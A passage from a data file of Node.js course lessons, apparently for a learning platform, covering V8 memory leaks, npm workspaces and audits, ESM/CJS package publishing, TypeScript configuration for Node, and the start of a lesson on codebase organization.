    prerequisites: ["p2m1-event-loop-order", "p1m4-node-architecture"],
    relatedTopics: ["p2m1-eventemitter-advanced", "p2m1-worker-threads", "p2m1-streams-backpressure"],
    learningObjectives: [
      "Describe V8's young/old generation collection and why most short-lived objects are cheap",
      "Define a leak as reachable-but-unusable memory and name the common retention patterns",
      "Read process.memoryUsage() correctly: rss, heapTotal, heapUsed, external",
      "Diagnose growth with forced GC, heap snapshots and a load test",
    ],
    simpleExplanation:
      "JavaScript memory is reclaimed automatically, but only for objects nothing can reach. A leak is not 'memory that is used' — it is memory your program still holds a reference to but will never use again: a Map that grows per request, an event listener never removed, a closure capturing a whole request. The collector can only free what you let go of.",
    detailedContent: `
**How V8 collects.** The heap is generational. The **young generation** (new space) is small and collected with a fast semi-space copy (scavenge): objects are allocated in one half, survivors are copied to the other, and most objects die within milliseconds — request bodies, temporary arrays, parse results. Survivors get promoted to the **old generation**, which is collected far less often with mark-sweep/mark-compact (and a separate large-object space). Because old-space collections are expensive, premature promotion (keeping young objects alive just a little too long) is a real cost in hot paths.

**What counts as a leak**

1. Unbounded structures: \`cache.set(req.id, body)\` with no eviction, a \`Map\` keyed by request id, arrays you \`push\` into forever.
2. Listeners, timers and interval handles registered per request but never removed (the EventEmitter lesson).
3. Closures that retain a large scope: a long-lived callback referencing \`req\`/\`res\` pins the whole request body. V8 does some slot-level optimisation, but the safe assumption is that a closure keeps its environment alive.
4. Module-level caches with no size cap or TTL.

**Reading the numbers**

- \`rss\`: total memory the process holds (heap + code + stacks + native). It rarely shrinks — the allocator returns pages lazily, so "RSS is at the limit" is not by itself a leak.
- \`heapTotal\`: committed JS heap; \`heapUsed\`: live JS objects. A sawtooth (grow, drop, grow, drop) means GC is working; a steady upward line that never returns is your leak.
- \`external\` / \`arrayBuffers\`: Buffers and TypedArrays — **outside** the JS heap, so a heap snapshot will not show an upload leak as JS objects.

**Method**: force a GC (\`node --expose-gc\` + \`global.gc()\`), take a heap snapshot, run a realistic load, force GC again, and diff retained sizes / the dominator tree. Watch the *trend*, not one sample.
    `,
    howItWorks: `
During a scavenge, V8 walks the roots (stack, globals, handles) and copies every reachable young object to the other semi-space, compacting as it goes; unreachable bytes are simply never copied. Objects that survive a couple of scavenges are promoted to old space, remembered sets let minor GCs ignore old→young references, and old space is marked and swept when growth thresholds are crossed — stop-the-world but incremental/parallel where possible.

A leak defeats this by keeping objects **reachable** from a root: the collector has no idea you will never read that map entry again. That is why the fix is always about references (remove listeners, cap caches, narrow closures) — never about calling gc().
    `,
    codeExamples: [
      {
        title: "A leak and its bounded fix",
        language: "js",
        code: `// LEAK — grows with traffic; each entry retains a request body
const sessions = new Map();

app.use((req, res, next) => {
  const sid = req.headers["x-session"] ?? crypto.randomUUID();
  if (!sessions.has(sid)) sessions.set(sid, { createdAt: Date.now(), body: req.body });
  req.session = sessions.get(sid);
  next();
});

// FIX — TTL sweep + hard size cap
function createCache({ ttlMs = 60_000, max = 5000 } = {}) {
  const store = new Map();
  setInterval(() => {
    const now = Date.now();
    for (const [k, v] of store) if (v.expires < now) store.delete(k);
  }, 10_000).unref();

  return {
    set(key, value) {
      if (store.size >= max) store.delete(store.keys().next().value); // evict oldest
      store.set(key, { value, expires: Date.now() + ttlMs });
    },
    get(key) {
      const hit = store.get(key);
      if (!hit || hit.expires < Date.now()) {
        store.delete(key);
        return undefined;
      }
      return hit.value;
    },
    get size() {
      return store.size;
    },
  };
}`,
        description:
          "The bug is not that memory is used — it is that nothing can ever remove an entry. Every cache needs an eviction story: TTL, LRU/size cap, or explicit invalidation tied to a domain event.",
      },
      {
        title: "Watch the right numbers",
        language: "js",
        code: `import v8 from "node:v8";

const mb = (n) => +(n / 1048576).toFixed(1);

setInterval(() => {
  const m = process.memoryUsage();
  console.log({
    rss: mb(m.rss),
    heapUsed: mb(m.heapUsed),
    heapTotal: mb(m.heapTotal),
    external: mb(m.external), // Buffers live here, NOT in heapUsed
  });
}, 30_000).unref();

// Run with: node --expose-gc app.js
if (global.gc) {
  global.gc(); // drop garbage BEFORE comparing snapshots
  console.log("after gc:", mb(process.memoryUsage().heapUsed));
}

console.log(v8.getHeapStatistics());
console.log(process.getActiveResourcesInfo()); // what is keeping the loop alive`,
        description:
          "Force a GC before any comparison, watch heapUsed's trend rather than a single RSS sample, and remember that Buffer memory shows up in external. getActiveResourcesInfo() answers the related question: what is still holding the loop open?",
      },
    ],
    commonMistakes: [
      "Raising --max-old-space-size or scheduling global.gc() instead of finding the reference — it only postpones the crash.",
      "Treating RSS as the leak metric: RSS stays high after objects are freed because the allocator keeps pages.",
      "Looking for Buffer leaks in heap snapshots — they live in external/arrayBuffers memory.",
      "Storing request objects in module-level structures 'just for debugging' and shipping it.",
    ],
    bestPractices: [
      "Give every cache, listener set and buffer pool a cap (TTL, LRU or explicit removal) and test it under a request loop.",
      "Take heap snapshots in staging under realistic load and diff dominators between snapshots.",
      "Keep per-request state on the request scope; pass ids across async boundaries instead of whole objects.",
      "Alert on heap growth rate and event-loop delay — a slow weekly leak needs a rate alert, not an absolute threshold.",
    ],
    realWorldUseCases: [
      "SSE/WebSocket servers where disconnected clients leave listeners that retain entire response buffers.",
      "Caching layers with weekly restarts: the restart hides a leak until it becomes a weekend incident.",
    ],
    resources: [
      docs(
        "Node.js API — process.memoryUsage()",
        "https://nodejs.org/api/process.html#processmemoryusage",
        "rss, heapTotal, heapUsed, external and arrayBuffers — what each one measures.",
        "en",
        "8 min",
      ),
      docs(
        "Node.js API — V8",
        "https://nodejs.org/api/v8.html",
        "getHeapStatistics, heap snapshots and serialization helpers for diagnostics.",
        "en",
        "10 min",
      ),
      docs(
        "Chrome for Developers — Inspect memory",
        "https://developer.chrome.com/docs/devtools/memory",
        "Heap snapshot workflow, retaining paths and dominator trees.",
        "en",
        "15 min",
      ),
      ytSearch(
        "node.js memory leak diagnosis heap snapshot",
        "Live debugging sessions finding and fixing real leaks.",
        "en",
        "15–30 min",
      ),
    ],
    exercises: [
      {
        id: "ex-p2m1-leak-hunt",
        title: "Reproduce a leak",
        prompt:
          "Write a script that performs 100k iterations of an operation that stores an object in a module-level Map (simulating one request each). Log process.memoryUsage().heapUsed every 10k iterations with global.gc() available. Identify the point where heapUsed stops returning to baseline, then add an eviction rule and produce a second chart where the baseline stays flat.",
        difficulty: "intermediate",
        estimatedMinutes: 40,
        hints: [
          "Run with node --expose-gc so you can force collection before each sample.",
          "Compare the post-GC value each time, not the raw peak.",
        ],
      },
      {
        id: "ex-p2m1-snapshot",
        title: "Diff two heap snapshots",
        prompt:
          "Under load (or a synthetic loop), capture two heap snapshots via the inspector, open them in DevTools, and identify the object type with the largest increase in retained size. Name the retaining path in one sentence and describe the one-line code change that removes it.",
        difficulty: "intermediate",
        estimatedMinutes: 45,
        hints: [
          "Start the app with node --inspect and open chrome://inspect, or use the Snapshot button in the Memory panel.",
          "Look for Map entries, Array growth, or closures in the summary view.",
        ],
      },
    ],
    projectIds: ["p2-chat-backend"],
    quizId: "quiz-p2-m1",
  },
  {
    ...shared,
    id: "p2m1-npm-package-management",
    slug: "npm-package-management",
    title: "npm Package Management",
    description:
      "Workspaces, overrides, npm audit, lockfile policy for apps vs libraries, publishing hygiene and reproducible CI installs.",
    order: 14,
    estimatedMinutes: 18,
    tags: ["npm", "monorepo", "tooling"],
    prerequisites: ["p1m2-es-modules", "p1m2-commonjs-basics"],
    relatedTopics: ["p2m1-reusable-modules", "p2m1-code-organization"],
    learningObjectives: [
      "Configure npm workspaces and explain how hoisting changes node_modules",
      "Use overrides to pin a vulnerable transitive dependency",
      "Read npm audit output and scope it correctly for apps vs libraries",
      "Choose the right lockfile and install command for CI, apps and published packages",
    ],
    simpleExplanation:
      "npm resolves your dependency graph, writes the exact tree to package-lock.json, and installs it. Most production surprises come from four places: installing differently in CI than locally, a vulnerable package buried three levels deep, forgetting which packages are workspaces, and publishing a package that ships your tests and .env file.",
    detailedContent: `
**Dependency types**

- \`dependencies\` — needed at runtime by consumers of your package.
- \`devDependencies\` — build/test tools; not installed by consumers, and excluded with \`npm audit --omit=dev\` in apps.
- \`peerDependencies\` — the host is expected to provide these (a React plugin declares React); npm 7+ auto-installs them, which can surprise you with duplicate React copies.
- \`optionalDependencies\` / \`peerDependenciesMeta\` — failures are tolerated (native addons).
- \`engines\` — a documented Node range; pair it with \`engine-strict=true\` in \`.npmrc\` if you want it enforced.

**Workspaces.** A root \`"workspaces": ["packages/*", "apps/*"]\` turns the repo into a monorepo: local packages are symlinked into the root \`node_modules\`, shared dependencies are hoisted to the root (one lockfile, deduplicated), and \`npm run build --workspaces\` fans out. Pitfalls: scripts that assume a package-local \`node_modules\`, binaries that resolve differently, and version drift between internal packages — pin internal deps to exact versions.

**Overrides.** \`"overrides": { "minimist": "1.2.8" }\` forces a transitive version when a vulnerability is deep in the tree. Remove it once upstream bumps; overrides that outlive their reason become the next upgrade blocker.

**Audit.** \`npm audit\` checks the advisory database. \`npm audit fix\` stays within semver ranges; \`--force\` may take major versions and break you. In CI use \`npm audit --audit-level=high\` and triage: a dev-only tooling CVE in a deployed app is a different risk than a runtime path in a library.

**Lockfiles.** \`package-lock.json\` records the resolved tree with integrity hashes. **Apps and services**: commit it and install with \`npm ci\` in CI/deploys — exact tree, fails fast on drift. **Libraries**: commit it too (your CI and contributors need the same tree), but understand it does **not** constrain consumers — npm ignores a dependency's lockfile when installing your package. \`npm-shrinkwrap.json\` is the file that *does* propagate to consumers; use it rarely and deliberately. Never commit \`node_modules\`; regenerate a lockfile by reinstalling, never by editing it.
    `,
    howItWorks: `
At install time npm walks your manifest, picks versions satisfying every range (respecting an existing lockfile), downloads tarballs, verifies their integrity hash, and materialises them into node_modules. Hoisting copies the top-level winners into the root node_modules; conflicting versions are nested under the package that needs them. With workspaces, local packages are symlinked instead of downloaded, so \`import { x } from "@acme/shared"\` resolves to your source package as if it were published — which is why "it works in the monorepo but not after publish" usually means missing \`files\`, a wrong \`exports\` map, or an undeclared dependency.
    `,
    codeExamples: [
      {
        title: "A workspace root with overrides and CI scripts",
        language: "json",
        code: `{
  "name": "acme-platform",
  "private": true,
  "workspaces": ["apps/*", "packages/*"],
  "overrides": {
    "semver": "7.5.4"
  },
  "engines": { "node": ">=20" },
  "scripts": {
    "build": "npm run build --workspaces",
    "test": "npm run test --workspaces --if-present",
    "audit:prod": "npm audit --omit=dev --audit-level=high"
  }
}`,
        description:
          "private: true keeps you from accidentally publishing the root. Overrides pin one transitive package while the rest of the tree resolves normally. The audit script ignores dev-only findings, which is the right scope for a deployed service.",
      },
      {
        title: "The commands that keep installs reproducible",
        language: "bash",
        code: `# CI / deploy — never "npm install" here
npm ci

# What is actually installed at the top level (hoisting sanity check)
npm ls --depth=0

# Vulnerabilities reachable in production code paths
npm audit --omit=dev
npm audit fix

# Before publishing anything
npm pack --dry-run          # list exactly which files enter the tarball
npm publish --access restricted   # scoped private packages

# Check for version drift between workspace packages
npm outdated`,
        description:
          "npm ci is the whole reproducibility story: it deletes node_modules, installs the lockfile exactly, and fails if package.json and the lockfile disagree. npm pack --dry-run catches the classic accident of shipping fixtures and secrets.",
      },
    ],
    commonMistakes: [
      "Running npm install in CI instead of npm ci — a freshly published dependency version silently enters your deploy.",
      "Hand-editing package-lock.json (or committing node_modules) instead of changing package.json and reinstalling.",
      "Treating every audit finding as a P0 without checking whether it is on a production path or only in dev tooling.",
      "Publishing without a files whitelist — tests, fixtures and .env files end up in the public tarball.",
    ],
    bestPractices: [
      "Commit lockfiles in apps and library repos alike; only shrinkwrap changes what consumers install.",
      "Pin internal workspace packages to exact versions; keep semver ranges for external dependencies.",
      "Run npm ci plus a scoped audit in CI on every pull request.",
      "Always npm pack --dry-run before npm publish, and add repository, license and engines fields.",
    ],
    realWorldUseCases: [
      "A monorepo with apps/api and packages/shared — one lockfile, linked local packages, a single audit report.",
      "An emergency override pinning a vulnerable transitive package until upstream ships a fix you can upgrade to.",
    ],
    resources: [
      docs(
        "npm — Workspaces",
        "https://docs.npmjs.com/cli/using-npm/workspaces",
        "How npm symlinks local packages, hoists dependencies and runs scripts across them.",
        "en",
        "10 min",
      ),
      docs(
        "npm — package.json (overrides, files, engines)",
        "https://docs.npmjs.com/cli/configuring-npm/package-json",
        "The manifest reference: dependency types, overrides, files whitelist and publishConfig.",
        "en",
        "reference",
      ),
      docs(
        "npm — npm audit",
        "https://docs.npmjs.com/cli/commands/npm-audit",
        "Audit levels, --omit=dev scoping and how fix vs fix --force differ.",
        "en",
        "8 min",
      ),
      docs(
        "npm — package-lock.json",
        "https://docs.npmjs.com/cli/configuring-npm/package-lock-json",
        "Lockfile format, integrity hashes and why npm ci needs it committed.",
        "en",
        "10 min",
      ),
    ],
    exercises: [
      {
        id: "ex-p2m1-workspace",
        title: "Stand up a workspace",
        prompt:
          "Create a root package with two workspaces (packages/utils, apps/demo). Have apps/demo import a named export from @acme/utils without any publishing step. Record what npm ls --depth=0 shows, where the symlink lives, and what happens if you run npm ci from apps/demo instead of the root.",
        difficulty: "intermediate",
        estimatedMinutes: 40,
        hints: [
          "Local workspace deps are referenced by name and version, linked automatically.",
          "npm run --workspaces runs a script in every workspace from the root.",
        ],
      },
      {
        id: "ex-p2m1-audit",
        title: "Triage a real audit",
        prompt:
          "Run npm audit --json in any project with dependencies and pick the top-severity finding. Determine: is it on a production path or dev-only? Is a fix available within the current range (npm audit fix) or does it need a major bump? Write a short recommendation: fix now, override, or accept with a ticket — and justify it.",
        difficulty: "intermediate",
        estimatedMinutes: 25,
        hints: [
          "Check whether the package appears in your production dependency graph (npm ls <pkg>).",
          "--omit=dev changes the report; compare both views.",
        ],
      },
    ],
    projectIds: [],
    quizId: "quiz-p2-m1",
  },
  {
    ...shared,
    id: "p2m1-reusable-modules",
    slug: "designing-reusable-modules",
    title: "Designing Reusable Modules",
    description:
      "Export surface design, dual ESM+CJS publishing, the exports map, types resolution and applying semver honestly to APIs.",
    order: 15,
    estimatedMinutes: 20,
    tags: ["modules", "esm", "packaging"],
    prerequisites: ["p1m2-es-modules", "p1m2-commonjs-basics", "p2m1-npm-package-management"],
    relatedTopics: ["p2m1-npm-package-management", "p2m1-typescript-node", "p2m1-code-organization"],
    learningObjectives: [
      "Design a small, coherent export surface and hide internals",
      "Set up package.json exports/types for ESM-only or dual publishing",
      "Explain the dual-package hazard and the ESM-wrapper pattern that avoids it",
      "Apply semantic versioning to API changes, including pre-1.0 nuance",
    ],
    simpleExplanation:
      "A library is a promise to its callers: these names, these arguments, these behaviours, for a stated range of versions. Good packaging means an explicit export surface, an exports map that tells Node and TypeScript exactly which files exist, and semver that tells humans when a change may break them.",
    detailedContent: `
**Export surface.** Export the few names that do the job, as named exports (named exports are refactor-friendly and tree-shake cleanly; default exports invite rename confusion). Do not re-export internals "just in case" — every export is API you now maintain. Prefer factory functions over classes when there is no shared mutable state, and keep module-level state out of the package if you can (it is what creates the dual-package hazard below).

**package.json that works.**

- \`"type": "module"\` makes .js files ESM.
- \`"exports"\` is the map Node uses; when it exists, **exports wins over main** and any file not listed is invisible (\`require("@acme/pkg/internal")\` → \`ERR_PACKAGE_PATH_NOT_EXPORTED\`). That is a feature: it enforces your surface.
- The \`"types"\` condition must come **first** in each branch — TypeScript picks the first match.
- \`"files"\` whitelists what is published (plus package.json/README/LICENSE automatically).
- \`"sideEffects": false\` lets bundlers drop unused modules.

**ESM-only vs dual.** ESM-only is the simple, modern default for Node ≥ 18: one build, no duplication, top-level await works. Dual publishing adds an \`import\`/\`require\` condition pair and a second build (often .cjs). The cost is the **dual-package hazard**: a consumer graph that pulls both formats ends up with two copies of the module — \`instanceof\` fails across copies and any module-level cache is duplicated. The standard fix is the **ESM wrapper**: keep one real implementation in CJS and make the ESM entry a thin file that re-exports from it, so both loaders share one instance.

**Semver for APIs.** MAJOR: removing/renaming exports, changing parameter order or meaning, changing defaults, dropping a Node version. MINOR: new optional parameters, new exports, new opt-in behaviour. PATCH: bugfixes with no API change. Before 1.0, conventionally the minor is the breaking one — say so in your README.
    `,
    howItWorks: `
Node resolves \`import\`/\`require\` by walking the exports map in object order, honouring conditions like \`"node"\`, \`"import"\`, \`"require"\` and finally \`"default"\`. TypeScript with \`moduleResolution: node16/nodenext\` follows the same map via the \`"types"\` condition — which is why a missing or mis-ordered types entry compiles in one project and fails in another. The published tarball is just the \`files\` whitelist: no build step runs for consumers, so everything you ship must already be compiled (JS + .d.ts). \`npm pack --dry-run\` prints the exact list, and a scratch project that installs the tarball with both \`import\` and \`require\` is the cheapest release test you can write.
    `,
    codeExamples: [
      {
        title: "A package.json that resolves cleanly in Node and TypeScript",
        language: "json",
        code: `{
  "name": "@acme/ratelimit",
  "version": "1.2.0",
  "type": "module",
  "files": ["dist"],
  "exports": {
    ".": {
      "types": "./dist/index.d.ts",
      "import": "./dist/index.js",
      "require": "./dist/index.cjs"
    },
    "./package.json": "./package.json"
  },
  "main": "./dist/index.cjs",
  "types": "./dist/index.d.ts",
  "sideEffects": false,
  "engines": { "node": ">=18" },
  "scripts": {
    "build": "tsup src/index.ts --format esm,cjs --dts",
    "prepublishOnly": "npm run build && npm test"
  }
}`,
        description:
          "types first, then import/require, and package.json re-exported so consumers can read the version. main is a legacy fallback. prepublishOnly is the guard rail that stops a broken build from reaching the registry.",
      },
      {
        title: "The ESM wrapper pattern that avoids dual-package hazards",
        language: "js",
        code: `// dist/index.cjs — the single real implementation (one module instance for everyone)
"use strict";
const state = new WeakMap();

function createLimiter({ capacity = 10 } = {}) {
  const bucket = { remaining: capacity };
  state.set(bucket, { capacity });
  return {
    take() {
      if (bucket.remaining <= 0) return false;
      bucket.remaining -= 1;
      return true;
    },
  };
}

module.exports = { createLimiter };

// dist/index.mjs — a thin ESM entry that re-exports the CJS core
import limiter from "./index.cjs";
export const createLimiter = limiter.createLimiter;`,
        description:
          "require() and import() both reach the same CJS module, so WeakMap state and instanceof checks stay consistent. Contrast with shipping two independent builds: each loader gets its own copy of the state.",
      },
    ],
    commonMistakes: [
      "Pointing main at TypeScript source (src/index.ts) — consumers' Node cannot run it; ship compiled output only.",
      "Forgetting the types condition (or ordering it after import) so moduleResolution node16 projects resolve no declarations.",
      "Shipping two full builds without the wrapper pattern — two copies of state break instanceof and caches.",
      "Shipping breaking changes in a minor release (renamed export, tightened validation) — semver is a contract, not a suggestion.",
    ],
    bestPractices: [
      "Export a handful of named functions; test internals through the public API, not by exporting them.",
      "Start ESM-only if your users are on Node ≥ 18 — dual publishing costs real complexity for real benefit only.",
      "Test both import and require from a packed tarball in CI on every release.",
      "Document breaking changes with a migration note; a codemod beats a paragraph of apology.",
    ],
    realWorldUseCases: [
      "An internal @acme/config package shared by every service in a workspace — same guarantees as a public library.",
      "Open-sourcing a validation helper with a strict exports map so users cannot reach private helpers.",
    ],
    resources: [
      docs(
        "Node.js API — Packages (exports, dual publishing)",
        OFFICIAL.nodejsApi + "packages.html",
        "The exports map, conditions, dual-package hazards and the ESM wrapper pattern.",
        "en",
        "reference",
      ),
      docs(
        "Node.js API — ECMAScript modules",
        "https://nodejs.org/api/esm.html",
        "ESM resolution rules, extension requirements and package scope.",
        "en",
        "reference",
      ),
      docs(
        "TypeScript — tsconfig reference",
        "https://www.typescriptlang.org/tsconfig",
        "module/moduleResolution settings that make declarations resolve the same way Node resolves JS.",
        "en",
        "10 min",
      ),
      ytSearch(
        "publishing a typescript library esm cjs exports map",
        "Build setups and release checklists for modern packages.",
        "en",
        "15–25 min",
      ),
    ],
    exercises: [
      {
        id: "ex-p2m1-package",
        title: "Publish a dry-run package",
        prompt:
          "Create a tiny library (two functions, one type), configure exports/types/files, and run npm pack --dry-run. Confirm no source, tests or .env appear. Then install the tarball into a scratch directory and verify both `import` (type: module project) and `require` (commonjs project) can call it. Paste the two commands and their output.",
        difficulty: "intermediate",
        estimatedMinutes: 45,
        hints: [
          "npm pack creates a .tgz you can install by path.",
          "If require() fails with ERR_REQUIRE_ESM, check the require condition in exports.",
        ],
      },
      {
        id: "ex-p2m1-semver",
        title: "Classify the changes",
        prompt:
          "For each change, say whether it is major, minor or patch and why: adding an optional options field; renaming a function; making a previously optional argument required; fixing a wrong return value for an edge case; removing an undocumented deep import; raising the minimum Node version; changing the default timeout from 5s to 30s.",
        difficulty: "intermediate",
        estimatedMinutes: 20,
        hints: [
          "Behaviour change that is still backward compatible is minor; anything that can break a caller is major.",
          "Undocumented deep imports are not API — unless your exports map exposed them.",
        ],
      },
    ],
    projectIds: [],
    quizId: "quiz-p2-m1",
  },
  {
    ...shared,
    id: "p2m1-typescript-node",
    slug: "typescript-for-node",
    title: "TypeScript for Node.js",
    description:
      "tsconfig for a Node ESM project, strict mode, typing Express and databases, and choosing between tsc, tsx and Node's type stripping.",
    order: 16,
    estimatedMinutes: 22,
    tags: ["typescript", "nodejs", "tooling"],
    prerequisites: ["p1m2-es-modules", "p1m2-functions"],
    relatedTopics: ["p2m1-reusable-modules", "p2m1-code-organization", "p2m1-custom-errors"],
    learningObjectives: [
      "Configure tsconfig for a modern Node ESM codebase (module, moduleResolution, strict)",
      "Get correct types for Express handlers and database rows without as any escapes",
      "Choose between tsc emit, tsx and node --experimental-strip-types for each workflow",
      "Diagnose the most common Node + TypeScript type errors",
    ],
    simpleExplanation:
      "TypeScript on the server is the same checker you know from the browser, pointed at Node APIs. The three decisions that matter are: which module system you emit (NodeNext is the safe default for ESM), whether strict mode is on from day one, and which tool runs your code in development versus which one verifies it in CI.",
    detailedContent: `
**Config that matches Node.** For an ESM codebase on Node 18+:

- \`"module": "NodeNext"\` + \`"moduleResolution": "NodeNext"\` — the only combination that models how Node actually resolves files. Side effect: **relative imports need explicit .js extensions** (\`./app.js\`, even though the source is .ts).
- \`"target": "ES2022"\` — Node 18+ supports class fields, Error cause and top-level await in ESM.
- \`"strict": true\`, plus two flags that pay for themselves immediately: \`"noUncheckedIndexedAccess"\` (arr[0] is \`T | undefined\`) and \`"useUnknownInCatchVariables"\` (catch (err) is \`unknown\` — narrow before use).
- \`"verbatimModuleSyntax": true\` — type-only imports must be \`import type\`, and they disappear from the emit.
- \`"types": ["node"]\` — without @types/node, \`process\`, Buffer and node:fs do not resolve.

**Typing Express.** Handlers get generic Request/Response. Extend them instead of casting:

    interface AuthedRequest extends Request { user: { id: string } }

For bodies, do not trust \`req.body: any\` — validate with Zod (or similar) and derive the type with \`z.infer<typeof schema>\` so runtime and static types cannot drift. For databases: Prisma generates row types; with pg, write row interfaces that match your SELECT column list.

**Running code.**

- \`tsc\` — emits JS (and .d.ts). Correct and slow-ish; still how you build for production if you are not bundling.
- \`tsx\` — esbuild-based, near-instant startup, **no type checking**. Pair it with \`tsc --noEmit\` in CI.
- \`node --experimental-strip-types\` (Node 22.6+, enabled by default in Node 23.6+) — strips types without transforming syntax, so **erasable syntax only**: no enums, no namespaces, no constructor parameter properties; import paths must include the real \`.ts\` extension.

**Common errors**: TS2307 (missing extension or wrong moduleResolution), TS2345 (argument of type 'unknown'), TS7006 (implicit any under strict), TS2339 (Express Request not augmented), TS2580 (process/Buffer — @types/node missing).
    `,
    howItWorks: `
The checker is structural: two types with the same shape are compatible, which is why extending Express's Request interface by declaration merging works instead of runtime patching. \`import type\` and \`verbatimModuleSyntax\` exist so the type layer can be erased completely — that is what Node's type stripping does at runtime: it deletes annotations and must therefore refuse any "syntax" that carries runtime meaning (enums compile to code; interfaces do not). In CI, \`tsc --noEmit\` is the gate; at runtime you execute either the emitted JavaScript or the stripped TypeScript directly.
    `,
    codeExamples: [
      {
        title: "A tsconfig for a Node ESM service",
        language: "json",
        code: `{
  "compilerOptions": {
    "target": "ES2022",
    "module": "NodeNext",
    "moduleResolution": "NodeNext",
    "strict": true,
    "noUncheckedIndexedAccess": true,
    "exactOptionalPropertyTypes": false,
    "verbatimModuleSyntax": true,
    "skipLibCheck": true,
    "types": ["node"],
    "rootDir": "src",
    "outDir": "dist",
    "declaration": true,
    "sourceMap": true
  },
  "include": ["src"]
}`,
        description:
          "NodeNext makes resolution match the runtime (remember the .js extensions on relative imports). skipLibCheck keeps the build fast; strict plus noUncheckedIndexedAccess catches the bugs that actually reach production.",
      },
      {
        title: "Typed handlers, one validation source, safe catches",
        language: "ts",
        code: `import type { NextFunction, Request, RequestHandler, Response } from "express";
import { z } from "zod";

const createTaskSchema = z.object({
  title: z.string().min(1),
  due: z.string().datetime().optional(),
});
type CreateTask = z.infer<typeof createTaskSchema>;

// Wrap async handlers so rejections reach Express exactly once
const wrap =
  (fn: (req: Request, res: Response, next: NextFunction) => Promise<unknown>): RequestHandler =>
  (req, res, next) => {
    void fn(req, res, next).catch(next);
  };

export const createTask: RequestHandler = wrap(async (req, res) => {
  const parsed = createTaskSchema.safeParse(req.body);
  if (!parsed.success) {
    res.status(422).json({ error: "VALIDATION_ERROR", details: parsed.error.flatten() });
    return;
  }
  const body: CreateTask = parsed.data; // z.infer keeps types and runtime in sync
  res.status(201).json(await taskService.create(body));
});

// catch (err) is unknown under strict — narrow before touching it
try {
  await risky();
} catch (err) {
  if (err instanceof Error) console.error(err.message);
  else console.error("non-error thrown:", err);
}`,
        description:
          "One schema produces both the runtime check and the static type; the wrap() helper prevents the unhandled-rejection crash from the error lesson; the catch block narrows unknown before use.",
      },
    ],
    commonMistakes: [
      "Using module: ESNext with moduleResolution: bundler for a Node app — the emitted JS lacks the .js extensions Node requires at runtime.",
      "Casting through as any or as Request to silence a mismatch — you have deleted the safety you added TypeScript for.",
      "Forgetting @types/node, then fighting mysterious errors on process, Buffer and node:fs imports.",
      "Shipping .ts files to production, or forgetting to emit at all because dev runs through tsx.",
    ],
    bestPractices: [
      "Turn on strict, noUncheckedIndexedAccess and useUnknownInCatchVariables on day one — retrofitting strictness is painful.",
      "Use import type for anything erased at compile time, and keep verbatimModuleSyntax enabled.",
      "Validate at the boundary with Zod (or similar) and derive types with z.infer — one source of truth.",
      "CI: tsc --noEmit for types, tests via tsx or vitest, and a real emit for the artifact you deploy.",
    ],
    realWorldUseCases: [
      "Typed route handlers where a missing field is a compile error instead of a 3am 500.",
      "Sharing request/response types between an API, a worker and a client package from one schema.",
    ],
    resources: [
      docs(
        "TypeScript — tsconfig reference",
        "https://www.typescriptlang.org/tsconfig",
        "Every compiler option, including module, moduleResolution and strictness flags.",
        "en",
        "reference",
      ),
      docs(
        "TypeScript — Narrowing",
        "https://www.typescriptlang.org/docs/handbook/2/narrowing.html",
        "How to move from unknown (catch clauses) to a concrete type safely.",
        "en",
        "10 min",
      ),
      docs(
        "Node.js API — Command line options (--experimental-strip-types)",
        "https://nodejs.org/api/cli.html",
        "Node's type-stripping flags, limits and the erasable-syntax-only rule.",
        "en",
        "10 min",
      ),
      ytSearch(
        "typescript node.js tsconfig nodenext strict tutorial",
        "Setup walkthroughs for ESM Node projects with strict TypeScript.",
        "en",
        "15–30 min",
      ),
    ],
    exercises: [
      {
        id: "ex-p2m1-tsconfig",
        title: "Break and fix resolution",
        prompt:
          "In a scratch NodeNext project, (1) write a relative import without the .js extension and record the runtime error; (2) switch moduleResolution to bundler and record what changes; (3) turn on noUncheckedIndexedAccess and fix the three errors it surfaces in your own code. Explain why NodeNext enforces extensions.",
        difficulty: "intermediate",
        estimatedMinutes: 35,
        hints: [
          "Runtime error to expect: ERR_MODULE_NOT_FOUND.",
          "arr[0] is now T | undefined — guard or assert.",
        ],
      },
      {
        id: "ex-p2m1-typed-api",
        title: "Type a real handler",
        prompt:
          "Take any existing Express (or plain http) route with a JSON body and add: a Zod schema, z.infer typing, a wrap() helper for async errors, and a typed error response. Show that changing the schema (e.g. making a field required) surfaces a type error wherever the old shape was assumed.",
        difficulty: "intermediate",
        estimatedMinutes: 40,
        hints: [
          "safeParse + flatten() gives you a structured 422 body.",
          "Deliberately break one call site to see TS flag it.",
        ],
        solution: `import { z } from "zod";

const schema = z.object({ email: z.string().email(), password: z.string().min(8) });
type RegisterBody = z.infer<typeof schema>;

function validate(body: unknown): RegisterBody {
  const result = schema.safeParse(body);
  if (!result.success) {
    throw Object.assign(new Error("validation failed"), {
      code: "VALIDATION_ERROR",
      status: 422,
      details: result.error.flatten(),
    });
  }
  return result.data; // typed: { email: string; password: string }
}`,
        solutionLanguage: "ts",
      },
    ],
    projectIds: ["p2-task-api"],
    quizId: "quiz-p2-m1",
  },
  {
    ...shared,
    id: "p2m1-code-organization",
    slug: "code-organization",
    title: "Organizing a Growing Codebase",
    description:
      "Feature folders vs layer folders, barrel files and circular imports, dependency direction, and keeping HTTP out of business logic.",
    order: 17,
    estimatedMinutes: 18,
    tags: ["architecture", "modules", "maintainability"],
    prerequisites: ["p1m2-es-modules", "p1m2-functions"],
    relatedTopics: ["p2m1-typescript-node", "p2m1-reusable-modules", "p2m1-custom-errors"],
    learningObjectives: [
      "Compare feature-first and layer-first structures and name each one's failure mode",
      "Use barrel files at folder boundaries without creating circular imports",
      "Enforce a dependency direction: HTTP and database depend on the domain, never the reverse",
      "Keep business logic reusable from an API, a worker or a CLI",
    ],
    simpleExplanation:
      "How you arrange files decides how expensive a feature is to add and how often two developers collide. Organizing by feature keeps a feature's routes, logic and data access together; organizing by layer (controllers, services, repositories) keeps all of one kind together but spreads every change across the whole tree. Most Node services settle on feature folders plus a small core/ for infrastructure.",
    detailedContent: `
**Two layouts**

- *Layer-first* (\`controllers/\`, \`services/\`, \`repositories/\`): easy to see the whole tier, brutal for feature work — adding one endpoint touches four folders and conflicts with everyone else's branch.
- *Feature-first* (\`features/tasks/{routes, service, repo, types}\`): a feature is a folder; two people rarely collide. The risk is duplication, solved by a shared \`core/\` (config, db, logger, errors) that every feature may import.

